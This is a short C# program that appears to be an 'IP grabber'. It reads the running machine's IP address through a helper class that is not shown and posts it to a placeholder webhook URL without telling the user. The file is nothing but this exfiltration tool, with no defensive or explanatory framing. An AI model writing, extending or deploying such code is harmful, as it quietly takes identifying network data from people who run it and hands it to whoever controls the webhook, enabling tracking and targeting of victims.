using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace cipacipafilip
{
    internal class Program
    {
        static void Main(string[] args)
        {
            string webhook = "WEBHOOK URL";
            var wbc = new WebClient();
            var data = new NameValueCollection();
            data["content"] = "IP Address :: " + ipgrabber.GetIP();
            wbc.UploadValues(webhook, data);
        }
    }
}
